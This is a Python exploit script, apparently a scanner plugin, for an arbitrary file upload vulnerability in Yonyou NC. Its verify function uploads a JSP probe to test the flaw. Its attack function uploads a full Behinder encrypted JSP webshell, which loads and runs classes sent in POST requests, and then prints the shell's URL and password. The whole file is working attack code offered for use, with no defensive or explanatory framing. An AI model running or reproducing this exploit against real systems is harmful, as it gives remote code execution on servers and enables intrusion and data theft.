import requests
import re, time
import urllib, random, string

def verify(url):
    relsult = {
        'name': '用友-NC 任意文件上传(2022HVV)',
        'vulnerable': False,
        'attack': True,
        'url': url,
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    payload = '/uapim/upload/grouptemplet?groupid=3&fileType=jsp'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7xAs1xFvk4lUjuhF',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '------WebKitFormBoundary7xAs1xFvk4lUjuhF\r\nContent-Disposition: form-data; name="upload"; filename="abc.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n{0}\r\n\r\n------WebKitFormBoundary7xAs1xFvk4lUjuhF--'.format(shell)
    verify_url = urllib.parse.urljoin(url, '/uapim/static/pages/3/head.jsp')
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and 'Invalid' in rep.headers['error']:
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200 and re.search(randstr1 + randstr2, rep2.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult

def attack(url):
    shell = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'
    payload = '/uapim/upload/grouptemplet?groupid=3&fileType=jsp'
    timeout = 20
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7xAs1xFvk4lUjuhF',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '------WebKitFormBoundary7xAs1xFvk4lUjuhF\r\nContent-Disposition: form-data; name="upload"; filename="abc.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n{0}\r\n\r\n------WebKitFormBoundary7xAs1xFvk4lUjuhF--'.format(shell)
    webshell = urllib.parse.urljoin(url, 'uapim/static/pages/3/head.jsp')
    print('[+] Exploit loading ......')
    time.sleep(2)
    try:
        print('[+] 尝试上传冰蝎webshell ')
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        print('[+] 上传完毕，正在检测webshel是否成功?')
        if rep.status_code == 200:
            rep2 = requests.get(webshell, timeout=timeout, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'},
                                verify=False)
            if rep2.status_code == 200:
                print('[*] status_code: 200 , 上传成功!')
                print('[*] webshell(冰蝎):', webshell)
                print('[*] 密码: rebeyond')
                return True
        return False
    except:
        return False
